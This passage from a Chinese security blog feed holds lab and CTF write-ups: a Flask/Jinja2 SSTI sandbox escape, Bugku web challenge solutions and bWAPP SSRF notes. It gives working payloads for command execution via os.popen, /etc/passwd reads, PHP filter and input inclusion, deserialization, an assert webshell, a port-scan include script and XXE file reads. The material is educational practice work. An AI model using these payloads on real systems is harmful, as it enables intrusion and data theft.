直接访问下面链接,可以得到结果1http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D python沙盒逃逸上面的POC测试用到一堆python特殊方法，初一看还看不懂，于是网上找了找资料学习总结了一下。找到的一些资料博客里管这个叫python沙盒逃逸。于是又查了下python沙盒逃逸的定义。 下面是一些python基础知识 python特殊方法0x01 __class____class__,返回当前对象所属的类 0x02 __base__ &amp;&amp; __bases____base__ 和 __bases__ 作用都是返回当前类所继承的类，即基类，区别是base返回单个，bases以元组形式返回所有基类。 0x03 __mro__以元组形式返回继承关系链 0x04 __globals__以dict形式返回函数所在模块命名空间中的所有变量 0x05 __subclasses__()以列表形式返回类的子类 0x06 __builtin__ &amp;&amp; __builtins__python中可以直接运行一些函数，例如int(),list()等等。这些函数可以在builtins中可以查到。查看的方法是dir(builtins)。在控制台中直接输入builtins会看到如下情况(python2)在python3中__builtin__被换成了builtin,python3中使用方法如下图__builtin__ 和 __builtins__之间是什么关系呢？ 在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。 非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身 利用python特殊方法bypass沙盒0x01 用file对象读取文件(python2)构造继承链的思路是 随便找一个内置类对象用class拿到他所对应的类 用bases拿到基类（） 用subclasses()拿到子类列表 在子类列表中直接寻找可以利用的类 ().\_\_class__.\_\_bases\_\_[0].\_\_subclasses__()在这堆列表里找到file对应的对象1234t = ().__class__.__bases__[0].__subclasses__()for c in t: if c.__name__ == 'file': print t.index(c) 现在用dir查看file对象的内置方法:dir(().\_\_class__.\_\_bases\_\_[0].\_\_subclasses__()[40])利用readlines方法读取/etc/passwd文件().\_\_class__.\_\_bases\_\_[0].\_\_subclasses__()[40](&#39;/etc/passwd&#39;).readlines 故可以构造ssti payload123456&#123;% for c in ().__class__.__bases__[0].__subclasses__():%&#125;&#123;% if c.__name__ == 'file':%&#125;&#123;&#123;"Success! File contents is &lt;br /&gt;"&#125;&#125;&#123;% c('/etc/passwd').readlines() %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; **注意: python3中file对象已不存在，故上面payload只适用于Python2 0x02寻找__builtins__中的eval上面file对象只能Python2使用，那么如果遇上Python3该怎么办呢。关于__builtins__,本文之前介绍python特殊方法是提到过，它包含了python的内置函数，而eval正在里面。所以只要找到eval，管他python2、python3，盘就完事了。 分别用python2、python3运行下面代码，找出含__builtins__的类，找一个python2、3共有的类123456for c in ().__class__.__bases__[0].__subclasses__(): try: #这里代码为啥要用try呢，因为不是每个对象都有\_\_globals__ if '__builtins__' in c.__init__.__globals__.keys(): print(c.name) except: pass 如：_IterationGuard类是python 2、3共有则可以构造下面payload,执行ls命令12345&#123;% for c in ().__class__.__bases__[0].__subclasses__(): %&#125;&#123;% if c.__name__ == '_IterationGuard': %&#125;&#123;&#123;c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 总结整个ssti复现下来，感觉还是很轻松的，可能是对python flask比较熟悉吧，希望接下来的其他漏洞复现不会自闭。。。 参考用python继承链搞事情Flask（Jinja2） 服务端模板注入漏洞(SSTI)Python沙箱逃逸总结]]></content>
      <categories>
        <category>漏洞复现</category>
        <category>flask/ssti</category>
      </categories>
      <tags>
        <tag>python security</tag>
        <tag>flask ssti</tag>
        <tag>Vulhub</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku Web Write up]]></title>
    <url>%2FCTF%2FBugku%2FWeb%2FBugku-Web-Write-up.html</url>
    <content type="text"><![CDATA[Bugku平台的Web题的Write up,差不多刷了一遍，总结一下。 前言进度稍微延迟了这么一点，本来是想着前天刷完，昨天写Blog。结果碰上最后几个注入题，有点自闭，多搞了一点时间，导致进度一拖再拖，昨天又玩了一下午游戏无所作为。想着不能再拖了，必须今天写掉，不然过几天忘干净了再写就没意义了。所以稍微少几个题，以后再写吧 直接从题目开写吧，遇到相应知识再拓展。 基础题0x01 Web2点进去一堆滑稽js脚本结合题目描述：“听说聪明的人都能找到答案” ，直接按F12。ctrl+F搜索flag，找到。 0x02 计算器点进题目，发现标题是随机数字运算验证码。本来还以为是要利用Session，写python脚本提交。最后居然只是前端输入框长度被限制。所以打开F12，找到输入框前端代码，更改输入框最大长度，再输入表达式计算值，弹出flag 0x03 web基础$_GET点进去看到题目给了源码。只需构造get请求传入what=flag即可。payload：http://123.206.87.240:8002/get/?what=flag 0x04 web基础$_POST点进去发现题目源码。与上题类似，不过是GET请求变成了POST，使用火狐插件hackbar或者其他类似插件构造post请求即可。这里注意，不要直接用burp将GET改POST，亲测无效。如下图示 不用hackbar正常的GET请求 将GET直接修改成POST提交数据无效这里据我个人分析，是因为直接改成POST后，服务器不知道接受的数据是什么类型。所以得不到flag，于是在文件头中加上Content-Type，得出了flag，证明猜测是对的 文件头加上Content-Type小小总结以后需要改POST的还是直接用hackbar吧，233~ 0x05 矛盾点击题目后，看到源码分析可知，需要GET传入num为数字1才能输出flag，但是如果输入纯数字的话，直接不满足if条件，进不去if语句里面，就输出不了flag。但是这里判断num等于1，用的是==，而不是===，就用到了php弱类型比较，即 1 == 1miracle是为true的。弱类型比较自行参照搜索引擎。于是可以构造payload：http://123.206.87.240:8002/get/index1.php?num=1miracle778 0x06 web3题目描述为: flag就在这里快来找找吧点击题目去，弹了一个框说flag就在这里，来找找吧一开始还没想到flag藏的具体位置，于是只能F12,看一下源码及http文件头。结果发现弹框的那段js代码，如下图,原来”在这里”的意思是说在js代码里。直接找到flag：&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt; 实体解码即可得flag：KEY{J2sa42ahJK-HS11III} 0x07 你必须让他停下点击题目去，如下图，页面一直在刷新，图片也是不停更换按照图中页面所述，本来以为要停在弹出一个熊猫的图片的地方，结果在页面出等了几秒，发现有些图片根本不存在，只有这一张2333~于是打开burp,看到访问历史里，jpg的名字随机更换，而且页面响应的地方有一个flag is here，如下图划线处。所以可以使用repeat一直按Go重放，直到出现flag为止。 0x08 文件包含好像题目链接挂了。。。 0x09 变量1点击题目，看到源码分析一下，可以看到var_dump那里出现$$,存在变量覆盖，前面正则对args进行了过滤，只能输入[a-z][0-9][A-Z]。因为存在变量覆盖，所以我们传入args=GLOBALS,即可达到输出$GLOBALS数组的目的，GLOBALS为php的超全局变量，一个包含了全部变量的全局组合数组。 0x10 web5题目描述：JSPFUCK??????答案格式CTF{**}点进题目并查看源码，发现一堆js混淆过的jsfuck。复制下来直接输入F12控制台即可得到flag，再将ctf改为大写即可 0x11 头等舱点进题目如图,源代码里也找不到啥东西结合题目：头等舱 猜测flag藏在http头里于是直接在响应的Headers里面找到 初级题0x12 网站被黑点进题目去，是一个如下图示界面,源代码、HTTP头都没找到什么东西结合题目意思，网站被黑，说不定留下了什么后门。于是用御剑(或者其他工具)扫一下后台,发现shell.php访问一下，看到一个登录框,随便输个密码，出现如图所警告到这一步的话，没有其他提示，只能先通过万能密码看看能不能绕过登录，不能的话再暴力破解用万能密码绕过失败，尝试Burp暴力破解，Burp暴力破解具体操作自行百度，或者参考我之前发的Dvwa暴力破解暴力破解选择simple list里的password字典进行爆破得到密码为hack输入密码即可得flag 0x13 管理员系统点进题目如图示,使用万能密码测试登录，提示说IP不允许访问，联系本地管理员登录于是添加XXF(X-Forwarded-For)=127.0.0.1进行登录尝试，提示说密码不对从上面尝试知道，万能密码不管用，所以密码可能藏在某个地方(也是凑巧发现233~)查看源代码，发现有一行诡异的base64注释，解码可得内容为test123于是用admin&amp;test123进行登录，同时添加XXF头，得到flag 0x14 web4题目如图示按提示查看源代码，如图发现一段被url编码的js脚本将这段代码进行解码，如图示通过阅读源码分析，只要在输入框输入67d709b2b54aa2aa648cf6e87a7114f1即可得到flag 0x15 flag在index里题目如图示点击链接后跳转到如图示地址很明显存在文件包含，结合题目标题 flag在index里，构造payload：http://123.206.87.240:8005/post/index.php?file=php://filter/read/convert.base64-encode/resource=index.php获取index.php源码将获取到的base64解码后得到网页源码,找到flag 0x16 输入密码查看flag题目如图很明显，用Burp暴力破解,得到密码为13579输入得flag：flag{bugku-baopo-hah} 0x17 点击一百万次题目hints为:JavaScript题目如图，每点击这个图片一次，数量加1，当数量为100万的时候出来flag显然，不可能为了一个flag浪费一个鼠标233~结合题目给的hints，于是查看前端关于点击的js代码分析可知，点击一次clicks加1，当clicks大于100万的时候，提交一个表单，value等于clicks的值，所以我们直接POST提交clicks即可。 0x18 备份是个好习惯点击题目如图示,出现一段hash编码乍一看还以为是md5，算了下长度，发现是64位，但是前32位跟后32位是相同的。感觉有点奇怪，于是把前32位md5解密一下，发现是个空密码。所以这段编码估计是没有什么用了。那应该怎么做呢?题目描述是备份是个好习惯猜测可能是备份文件泄露漏洞。于是访问index.php.bak，可以下载。于是打开备份文件查看源码分析一下，这里代码意思是，第11行获取url ?及?后的字符串,第12行去除?,第13行剩下字符串中的key替代成’’,第14行解析字符串，即将 key1=234&amp;key2=123解析成$key1=234、$key2=123。到了这里就应该明白了，主要考察两个点，第一是13行处，绕过str_replace。绕过之后，来到第二处，md5弱类型比较。对于第一个点，可以使用双写绕过，第二个点的话，可以利用两个字符串md5都是0e开头绕过，或者将key1 key2赋为两个不同数组进行绕过(md5不能对数组进行操作，会返回null=null) payload1: http://123.206.87.240:8002/web16/index.php?kekeyy1=QNKCDZO&amp;kekeyy2=aabg7XSspayload2: http://123.206.87.240:8002/web16/index.php?kekeyy1[]=1&amp;kekeyy2[]=12 0x19 成绩单打开题目链接后,题目如图示简单的输入 1’、1’#测试后，发现存在sql注入漏洞，于是开始进行注入 用order by测试出有4个字段 union查看一下哪些字段可显示 爆表 爆fl4g表的列 爆flag值 入门题0x20 秋名山老司机点进链接，题目如图示请在两秒内计算车速，很明显要用到python脚本。但计算出车速来应该怎么提交呢?于是多刷新几遍,发现题目偶尔会变成下图示，里面讲到了通过post提交参数value于是写一个python脚本1234567891011121314151617181920#!/usr/bin/env python3# coding=UTF-8'''@Author: Miracle778@LastEditors: Miracle778@Description: file content@Date: 2019-04-01 10:24:57@LastEditTime: 2019-04-01 12:59:49'''import requestsfrom bs4 import BeautifulSoups = requests.Session()r = s.get('http://123.206.87.240:8002/qiumingshan/')soup = BeautifulSoup(r.text,'html.parser')exp = soup.find_all('div')[0].string[:-3]# print(exp)value = &#123;'value':eval(exp)&#125;r = s.post('http://123.206.87.240:8002/qiumingshan/',data=value)print(r.text) 利用bs4提取表达式并计算。然后使用POST提交运行脚本即可得flag 0x21 速度要快题目点进去如图示没找到别的信息。用burp看一下http头部跟页面源码，发现下图示信息。上图注释信息说明需要POST提交参数margin的值，margin的值估计就是头部中的flag。将头部中的flag base64解密一下得到如下信息于是进行POST提交 margin=NDk4MDQ2,用火狐hackbar提交后，提示说不够快既然手工不够快，那就用python跑一下吧。12345678910111213141516171819202122#!/usr/bin/env python# coding=UTF-8'''@Author: Miracle778@LastEditors: Miracle778@Description: file content@Date: 2019-04-01 13:06:09@LastEditTime: 2019-04-04 20:48:35'''import requestsimport base64s = requests.Session()r = s.get('http://123.206.87.240:8002/web6/')flag_header = r.headers['flag'].encode('utf-8')flag_message = base64.b64decode(flag_header).decode('utf-8')tmp_list = flag_message.split(': ')margin = base64.b64decode(tmp_list[-1].encode('utf-8')).decode()data = &#123;'margin':margin&#125;r = s.post("http://123.206.87.240:8002/web6/",data=data)print(r.text) 跑一下，出来结果 0x22 cookies欺骗打开题目链接页面如下页面一段字符，看上去也不像什么编码。于是找http头部看看有没有啥提示。但找了一圈并没有发现。但是看到访问url时，发现有的猫腻，url两个参数，一个line、另一个filename，filename的值还用base64加密了一手。于是将filename的值解密一下看看，解密结果为keys.txt。直接访问keys.txt看一下。与前面内容一样所以可以得出结论，前面index.php的两个参数line和filename可以用来读取网页源文件，于是将index.php用base64加密，line从0开始，将index.php一行行读出来。避免繁琐，可以写个python脚本。123456789101112131415161718192021222324252627#!/usr/bin/env python# coding=UTF-8'''@Author: Miracle778@LastEditors: Miracle778@Description: 导出生成index.php@Date: 2019-04-01 13:37:02@LastEditTime: 2019-04-01 14:01:33'''import requestsurl = 'http://123.206.87.240:8002/web11/index.php'# url.format(2)data = &#123;'filename':'aW5kZXgucGhw'&#125;res = ''# r = requests.get(url+'?line=100',params=data)for i in range(100): data['line'] = i r = requests.get(url,params=data) if r.text == '': break res += r.textf = open('./Bugku/Web/cookies欺骗/index.php','w')f.write(res)f.close 得到index.php源码由index.php源码可知，只能通过filename读取file_list数组里的文件，而如果想读取keys.php的话，就需要构造cookie使得$_COOKIE[‘margin’]==’margin’成立。于是再写一个python脚本，添加上Cookie值，将keys.php再导出来123456789101112131415161718192021222324252627#!/usr/bin/env python# coding=UTF-8'''@Author: Miracle778@LastEditors: Miracle778@Description: 导出keys.php@Date: 2019-04-01 14:01:56@LastEditTime: 2019-04-01 14:11:45'''import requestsurl = 'http://123.206.87.240:8002/web11/index.php'# 设置cookie不通过header# header = &#123;'Cookie':&#123;"margin":"margin"&#125;&#125;cookie = &#123;'margin':'margin'&#125;data = &#123;'filename':'a2V5cy5waHA='&#125;res = ''for i in range(100): data['line'] = i r = requests.get(url,params=data,cookies=cookie) if r.text == '': break res += r.text# print(res)f = open('./Bugku/Web/cookies欺骗/keys.php','w')f.write(res)f.close keys.php的源码如下图得到flag 0x23 never give up点进题目去，如图示流程走一遍，查看源码及http头，在源码处发现提示：1p.html访问一下，发现直接被重定向了。于是只好查看1p.html的源代码,发现一段编码解密后得到下面代码123456789var Words ="&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; &lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord(); 其余代码无关紧要，作用就是进行重定向。真正有用的是&lt;!–里这段base64编码，将这段编码先base64再url解码得到下面代码。12345678910111213141516171819202122232425";if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("f4l2a3g.txt");&#125;else&#123; print "never never never give up !!!";&#125;?&gt; 到这里就很明显了，传入a,b,id三个参数，分别满足if条件即可在这里，a利用的是文件包含，用php://input协议传入数据;b利用ereg函数的%00截断以同时满足eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4这两个矛盾点;还有一个id == 0容易被忽略，本来我以为直接id=0就能绕过，这个条件是不是太简单了。后面发现id = 0的话，!$_GET[‘id’]就满足了，直接退出，根本就到不了后面，所以id还要利用一手php弱类型比较所以最终payload为：url: http://123.206.87.240:8006/test/hello.php?id=0miracle778&amp;a=php://input&amp;b=%001234566post:bugku is a nice plateform!当然也可以直接访问f4l2a3g.txt，233 0x24 welcome to bugkuctf点进题目去，F12审查一下元素发现代码，简单审计后，发现可以文件包含。构造payloadurl: http://123.206.87.240:8006/test1//test1/?txt=php://input&amp;file=php://filter/read/convert.base64-encode/resource=hint.phppost: welcome to the bugkuctf得到hint.php源码12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 这里得到信息还是不够完善，于是将上面payload中的file更改一下，将index.php源码读出来1234567891011121314151617181920&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; 由index.php代码分析来看，flag应该藏在flag.php里，但是通过文件包含应该是出不来，因为include前进行了一步正则匹配，file参数值不能含flag，双写flag也没能绕过去。所以文件包含是得不到flag的，往下看，发现$password = unserialize($password);终于第三个参数用到了。这里存在反序列化漏洞。具体参考:php反序列化漏洞于是可以构造payloadurl: http://123.206.87.240:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}post: welcome to the bugkuctf 0x25 过狗一句话题目描述：123456&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 实际就是 assert($_GET[&#39;s&#39;]) 一句话木马所以可以传入 s=cmd 进行命令执行于是构造 s=print_r(scandir(‘./‘)) 进行文件扫描。看到一个flag_xx.txt直接访问即可或者构造 s=print_r(readfile(‘./flag_sm1skla1.txt’))读取 2019/4/8 更 0x26 字符？正则？题目链接进去，发现给了代码，这就好办了，把代码看懂就好了。这里的意思是GET传入id的值进行一个正则匹配，匹配的话就能得到flag。直接给个链接学一波PHP正则构造符合条件的payload: keyAAkeyAAAAkey:/A/AAkeya@得到flag 0x27 login1(SKCTF)题目hint说是 SQL约束攻击点进去看到是一个管理系统登录框试了下万能密码，发现绕不过去，然后发现有注册功能，随便注册一个账号，用注册的账号进行登录，发现提示说不是管理员不能看flag然后理所当然的去注册admin账号，不出意外的果然提示说admin已存在我做的时候是没有看到hint的，于是自然而然想是不是可以通过sql注入，注入update语句修改admin密码，从而达到目的。后面自然是失败了。后面实在没办法，只能去看看别人的WP了，结果才发现有hint，2333~,以后一定要仔细看题目。那提示是说SQL约束攻击，于是百度一下。基于约束的SQL攻击使用’admin ‘做用户名进行注册登录即可。 0x28 你从哪里来题目进去是一句话 ：are you from google?很容易就联想到更改http头部，增加Referer 0x29 md5 collision(NUPT_CTF)这个题目之前在南邮网络攻防平台上做过，不过那边给了代码，这里代码提示什么都没给，只有一个please input a，有点尴尬，这里虽然知道怎么做，但是还是不写好了。 0x30 程序员本地网站题目进去说请从本地访问···感觉有点瓜皮，这题目做着做着又回到前面几题简单题一样了。直接修改XXF头为127.0.0.1即可。图都懒得截了。 0x31 各种绕过题目进去又给代码。分析一下，id 可以url双重编码绕过，uname和passwd只能用sha1对数组操作返回Null来绕过了。这里注意passwd使用post提交的，之前0x04的时候说过，post请求还是用hackbar提交吧。这里也是，用burp直接提交是得不到flag的。还是要用hackbar提交一手 小小总结新版火狐的hackbar也有个小缺点，就是post提交数据的时候，一定要有参数名，也就是说遇上php://input这种的话，Execute不动，post不了数据。所以做个小总结，遇见php://input用burp，遇见post name=value这种用hackbar，遇见两者皆有，那就用burp改GET为POST,手动加Content-Type。 0x32 web8题目描述：txt？？？？题目进去又有代码看很明显了，看到file_get_contents就要想到php://input最后payloadurl:http://123.206.87.240:8002/web8/?ac=Miracle778&amp;fn=php://inputpost:Miracle778 0x33 细心题目描述：想办法变成admin题目进去如下图网页源代码及http头找了一遍没找到啥信息或提示于是直接扫后台吧。不过扫之前可以先试试robots.txt存不存在这里是存在的，访问一下看看,发现存在一个resusl.php访问一下，得到下图页面看到 管理员、IP这两个字，都顾不得别的，弄得我直接改XXF头为127.0.0.1，然并卵，并无任何作用。后面仔细分析，看到那句代码 if($_GET(x)==$password),感觉有点奇怪，这password鬼知道是谁。。后面回看一下题目，题目叫细心，描述说想办法变成admin，么得办法，把admin当password提交一手，还真就爆出来flag了。 分界线 今天就到这~~择日再更]]></content>
      <categories>
        <category>CTF</category>
        <category>Bugku</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF学习]]></title>
    <url>%2FWeb%E5%AE%89%E5%85%A8%2FSSRF%2FSSRF%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[关于SSRF的一些学习笔记，会介绍SSRF的利用原理及两个bWapp中关于SSRF的案例 前言学习SSRF的一些笔记，记录一遍，以便加深印象。话不多说，先给出链接参考链接：SSRF、SSRF学习之路 SSRF是什么 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成，服务端发起请求的一个安全漏洞。一般情况下，SSRF的目标是目标网站的内部系统。（因为他是从内部系统访问的，所以可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人） SSRF形成原因 SSRF形成的原因大多是由于服务端提供了从其他服务器应用获取数据的功能，但没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。 总结来说SSRF漏洞就是黑客通过篡改服务器获取资源的请求，而服务器并没有检测这个请求是否合法，然后黑客就可以以目标网站的身份来访问服务器的一些内部资源 SSRF的用途SSRF可以用来： 内外网的端口和服务扫描 目标网站本地敏感数据的读取 内外网主机应用程序漏洞的利用 内外网Web站点漏洞的利用… SSRF漏洞常见出现位置由上面叙述中可以得知，SSRF漏洞都是在服务端获取其他站点的资源的过程中形成的。故可以盯紧调用外部资源的参数寻找SSRF漏洞这里具体可以参考: SSRF漏洞的挖掘经验就简单概括一下吧，具体看上述链接 分享：通过URL地址分享网页内容 转码服务 在线翻译 图片加载与下载：通过URL地址加载或下载图片 图片、文章收藏功能 未公开的api实现以及其他调用URL的功能 从URL关键字中寻找: share wap url link src source target u 3g display sourceURl imageURL domain ... SSRF漏洞的简单判断方法 因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞 在页面源码中查找访问的资源地址,如果资源地址类型为www&#46;hdu&#46;edu&#46;cn/xxx.php?image=\的话，则有可能出现SSRF漏洞 SSRF实例 —— bWapp中的SSRF任务列表选择bWapp中的SSRF环境，可以看到有三个任务，第三个因为没有实验环境，所以就做两个。 0x01 利用RFI进行端口扫描点击 Port scan，获取一个利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phpecho "&lt;script&gt;alert(\"U 4r3 0wn3d by MME!!!\");&lt;/script&gt;";if(isset($_REQUEST["ip"]))&#123; //list of port numbers to scan $ports = array(21, 22, 23, 25, 53, 80, 110, 1433, 3306); $results = array(); foreach($ports as $port) &#123; if($pf = @fsockopen($_REQUEST["ip"], $port, $err, $err_string, 1)) //创建一个套接字连接到指定IP，成功返回句柄，失败false &#123; $results[$port] = true; fclose($pf); &#125; else &#123; $results[$port] = false; &#125; &#125; foreach($results as $port=&gt;$val) &#123; $prot = getservbyport($port,"tcp"); //返回端口对应协议 echo "Port $port ($prot): "; if($val) &#123; echo "&lt;span style=\"color:green\"&gt;OK&lt;/span&gt;&lt;br/&gt;"; &#125; else &#123; echo "&lt;span style=\"color:red\"&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;"; &#125; &#125;&#125;?&gt; 分析代码相应重要注释我已经在上面代码中写出，这里就简单写写。 首先看到if(isset($_REQUEST[&quot;ip&quot;]))，先要提交传递IP参数才能激活脚本。 然后是两个foreach循环，第一个循环是标记出目标IP 21, 22, 23, 25, 53, 80, 110, 1433, 3306这些常用端口的开放情况，开放即为true、关闭为false。第二个循环是将上一个循环判断得出的端口开放情况并加上端口对应的服务协议输出。 利用脚本 将bWapp的漏洞环境切换为RFI/LFI 可以看到有个选择语言的按钮，点击后观察到页面的url变化为http://192.168.164.131/bWAPP/rlfi.php?language=lang_en.php&amp;action=go,其中language参数此处存在远程文件包含漏洞，也就是说可以通过此处调用恶意脚本。 脚本的url地址是http://192.168.164.131/evil/ssrf-1.txt,将url复制下来，构造payload POST: http://192.168.164.131/bWAPP/rlfi.php?language=http://192.168.164.131/evil/ssrf-1.txt&amp;action=goPOST Data: ip=xx.xx.xx.xx 0x02 利用XXE获取敏感文件中的内容点击 Access 获取脚本1234567891011121314151617# Accesses a file on the internal network (1)&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt"&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;bWAPP;&lt;/login&gt;&lt;secret&gt;blah&lt;/secret&gt;&lt;/reset&gt;# Accesses a file on the internal network (2)# Web pages returns some characters that break the XML schema &gt; use the PHP base64 encoder filter to return an XML schema friendly version of the page!&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY bWAPP SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml"&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;bWAPP;&lt;/login&gt;&lt;secret&gt;blah&lt;/secret&gt;&lt;/reset&gt; 利用脚本此处是利用bWapp中的XXE环境进行实验，关于bWapp中XXE的实验我之前已经写过了这里就不多说了。区别就是将payload分别换成此处脚本中的。 获取robots.txt文件 获取heroes.html源码 总结SSRF就到这里了。现在都在更些基础的东西，希望日后能多写点更深层次的。]]></content>
      <categories>
        <category>Web安全</category>
        <category>SSRF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc学习(一)]]></title>
    <url>%2FCTF%2FBugku%2FMisc%2FMisc%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
